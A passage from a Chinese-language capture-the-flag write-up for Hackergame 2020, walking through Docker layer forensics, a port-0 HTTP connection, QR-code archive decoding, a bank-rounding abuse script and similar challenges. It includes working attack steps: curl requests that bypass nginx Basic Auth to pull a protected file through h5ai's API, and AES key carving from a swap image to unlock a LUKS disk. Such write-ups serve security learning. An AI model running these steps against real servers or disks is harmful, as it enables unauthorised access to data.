<code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 